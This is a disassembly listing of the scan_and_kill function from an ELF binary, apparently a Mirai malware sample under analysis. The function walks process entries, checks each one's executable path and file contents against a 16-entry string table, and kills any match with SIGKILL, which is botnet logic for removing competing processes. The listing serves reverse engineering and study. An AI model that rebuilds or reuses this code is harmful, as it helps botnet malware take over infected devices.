
/Users/taogoldi/Projects/malware/Mirai/input/d40cf9c95dcedf4f19e4a5f5bb744c8e98af87eb5703c850e6fda3b613668c28.elf:	file format elf64-x86-64

Disassembly of section .text:

0000000000400d60 <scan_and_kill>:
  400d60: 41 57                        	push	r15
  400d62: bf d4 4b 41 00               	mov	edi, 0x414bd4
  400d67: 41 56                        	push	r14
  400d69: 41 55                        	push	r13
  400d6b: 41 54                        	push	r12
  400d6d: 55                           	push	rbp
  400d6e: 53                           	push	rbx
  400d6f: 48 81 ec 18 32 00 00         	sub	rsp, 0x3218
  400d76: e8 0d 6e 00 00               	call	0x407b88 <opendir>
  400d7b: 48 85 c0                     	test	rax, rax
  400d7e: 49 89 c5                     	mov	r13, rax
  400d81: 0f 84 7b 01 00 00            	je	0x400f02 <scan_and_kill+0x1a2>
  400d87: 4c 8d b4 24 10 10 00 00      	lea	r14, [rsp + 0x1010]
  400d8f: 4c 8d bc 24 10 30 00 00      	lea	r15, [rsp + 0x3010]
  400d97: e8 74 63 00 00               	call	0x407110 <getpid>
  400d9c: 89 44 24 04                  	mov	dword ptr [rsp + 0x4], eax
  400da0: e8 93 63 00 00               	call	0x407138 <getppid>
  400da5: 89 44 24 08                  	mov	dword ptr [rsp + 0x8], eax
  400da9: e8 62 fe ff ff               	call	0x400c10 <are_infection_tools_disabled>
  400dae: 89 44 24 0c                  	mov	dword ptr [rsp + 0xc], eax
  400db2: 4c 89 ef                     	mov	rdi, r13
  400db5: e8 c2 6e 00 00               	call	0x407c7c <readdir>
  400dba: 48 85 c0                     	test	rax, rax
  400dbd: 48 89 c1                     	mov	rcx, rax
  400dc0: 0f 84 34 01 00 00            	je	0x400efa <scan_and_kill+0x19a>
  400dc6: 48 0f be 51 13               	movsx	rdx, byte ptr [rcx + 0x13]
  400dcb: 48 8b 05 6e f2 11 00         	mov	rax, qword ptr [rip + 0x11f26e] # 0x520040 <__ctype_b>
  400dd2: f6 04 50 08                  	test	byte ptr [rax + 2*rdx], 0x8
  400dd6: 74 da                        	je	0x400db2 <scan_and_kill+0x52>
  400dd8: 4c 8d 61 13                  	lea	r12, [rcx + 0x13]
  400ddc: 4c 89 e7                     	mov	rdi, r12
  400ddf: e8 e8 b2 00 00               	call	0x40c0cc <atoi>
  400de4: 83 f8 01                     	cmp	eax, 0x1
  400de7: 89 c5                        	mov	ebp, eax
  400de9: 0f 9e c2                     	setle	dl
  400dec: 39 44 24 04                  	cmp	dword ptr [rsp + 0x4], eax
  400df0: 0f 94 c0                     	sete	al
  400df3: 08 c2                        	or	dl, al
  400df5: 75 bb                        	jne	0x400db2 <scan_and_kill+0x52>
  400df7: 39 6c 24 08                  	cmp	dword ptr [rsp + 0x8], ebp
  400dfb: 74 b5                        	je	0x400db2 <scan_and_kill+0x52>
  400dfd: 48 8d bc 24 10 20 00 00      	lea	rdi, [rsp + 0x2010]
  400e05: 4c 89 e1                     	mov	rcx, r12
  400e08: ba da 4b 41 00               	mov	edx, 0x414bda
  400e0d: be 00 10 00 00               	mov	esi, 0x1000
  400e12: 31 c0                        	xor	eax, eax
  400e14: e8 e7 71 00 00               	call	0x408000 <snprintf>
  400e19: 48 8d bc 24 10 20 00 00      	lea	rdi, [rsp + 0x2010]
  400e21: ba ff 0f 00 00               	mov	edx, 0xfff
  400e26: 4c 89 f6                     	mov	rsi, r14
  400e29: e8 52 68 00 00               	call	0x407680 <readlink>
  400e2e: 48 85 c0                     	test	rax, rax
  400e31: 7e 37                        	jle	0x400e6a <scan_and_kill+0x10a>
  400e33: c6 84 04 10 10 00 00 00      	mov	byte ptr [rsp + rax + 0x1010], 0x0
  400e3b: 31 db                        	xor	ebx, ebx
  400e3d: 66 66 90                     	nop
  400e40: 48 8b 34 dd 20 76 51 00      	mov	rsi, qword ptr [8*rbx + 0x517620]
  400e48: 4c 89 f7                     	mov	rdi, r14
  400e4b: e8 90 fe ff ff               	call	0x400ce0 <strcasestr>
  400e50: 48 85 c0                     	test	rax, rax
  400e53: 74 0c                        	je	0x400e61 <scan_and_kill+0x101>
  400e55: be 09 00 00 00               	mov	esi, 0x9
  400e5a: 89 ef                        	mov	edi, ebp
  400e5c: e8 b7 63 00 00               	call	0x407218 <kill>
  400e61: 48 ff c3                     	inc	rbx
  400e64: 48 83 fb 10                  	cmp	rbx, 0x10
  400e68: 75 d6                        	jne	0x400e40 <scan_and_kill+0xe0>
  400e6a: 8b 44 24 0c                  	mov	eax, dword ptr [rsp + 0xc]
  400e6e: 85 c0                        	test	eax, eax
  400e70: 0f 84 9e 00 00 00            	je	0x400f14 <scan_and_kill+0x1b4>
  400e76: 48 8d 7c 24 10               	lea	rdi, [rsp + 0x10]
  400e7b: 4c 89 e1                     	mov	rcx, r12
  400e7e: ba e7 4b 41 00               	mov	edx, 0x414be7
  400e83: be 00 10 00 00               	mov	esi, 0x1000
  400e88: 31 c0                        	xor	eax, eax
  400e8a: e8 71 71 00 00               	call	0x408000 <snprintf>
  400e8f: 48 8d 7c 24 10               	lea	rdi, [rsp + 0x10]
  400e94: be fd 4b 41 00               	mov	esi, 0x414bfd
  400e99: e8 72 6f 00 00               	call	0x407e10 <fopen>
  400e9e: 48 85 c0                     	test	rax, rax
  400ea1: 49 89 c4                     	mov	r12, rax
  400ea4: 0f 84 08 ff ff ff            	je	0x400db2 <scan_and_kill+0x52>
  400eaa: 4c 89 e2                     	mov	rdx, r12
  400ead: be 00 02 00 00               	mov	esi, 0x200
  400eb2: 4c 89 ff                     	mov	rdi, r15
  400eb5: e8 c2 85 00 00               	call	0x40947c <fgets>
  400eba: 48 85 c0                     	test	rax, rax
  400ebd: 74 67                        	je	0x400f26 <scan_and_kill+0x1c6>
  400ebf: 31 db                        	xor	ebx, ebx
  400ec1: eb 09                        	jmp	0x400ecc <scan_and_kill+0x16c>
  400ec3: 48 ff c3                     	inc	rbx
  400ec6: 48 83 fb 10                  	cmp	rbx, 0x10
  400eca: 74 de                        	je	0x400eaa <scan_and_kill+0x14a>
  400ecc: 48 8b 34 dd 20 76 51 00      	mov	rsi, qword ptr [8*rbx + 0x517620]
  400ed4: 4c 89 ff                     	mov	rdi, r15
  400ed7: e8 04 fe ff ff               	call	0x400ce0 <strcasestr>
  400edc: 48 85 c0                     	test	rax, rax
  400edf: 74 e2                        	je	0x400ec3 <scan_and_kill+0x163>
  400ee1: 4c 89 e7                     	mov	rdi, r12
  400ee4: e8 23 6e 00 00               	call	0x407d0c <fclose>
  400ee9: be 09 00 00 00               	mov	esi, 0x9
  400eee: 89 ef                        	mov	edi, ebp
  400ef0: e8 23 63 00 00               	call	0x407218 <kill>
  400ef5: e9 b8 fe ff ff               	jmp	0x400db2 <scan_and_kill+0x52>
  400efa: 4c 89 ef                     	mov	rdi, r13
  400efd: e8 12 6c 00 00               	call	0x407b14 <closedir>
  400f02: 48 81 c4 18 32 00 00         	add	rsp, 0x3218
  400f09: 5b                           	pop	rbx
  400f0a: 5d                           	pop	rbp
  400f0b: 41 5c                        	pop	r12
  400f0d: 41 5d                        	pop	r13
  400f0f: 41 5e                        	pop	r14
  400f11: 41 5f                        	pop	r15
  400f13: c3                           	ret
  400f14: 4c 89 e7                     	mov	rdi, r12
  400f17: e8 f4 fb ff ff               	call	0x400b10 <cmdline_scan_match>
  400f1c: 85 c0                        	test	eax, eax
  400f1e: 0f 84 52 ff ff ff            	je	0x400e76 <scan_and_kill+0x116>
  400f24: eb c3                        	jmp	0x400ee9 <scan_and_kill+0x189>
  400f26: 4c 89 e7                     	mov	rdi, r12
  400f29: 66 66 66 90                  	nop
  400f2d: 66 66 90                     	nop
  400f30: e8 d7 6d 00 00               	call	0x407d0c <fclose>
  400f35: e9 78 fe ff ff               	jmp	0x400db2 <scan_and_kill+0x52>
  400f3a: 90                           	nop
  400f3b: 90                           	nop
  400f3c: 90                           	nop
  400f3d: 90                           	nop
  400f3e: 90                           	nop
  400f3f: 90                           	nop
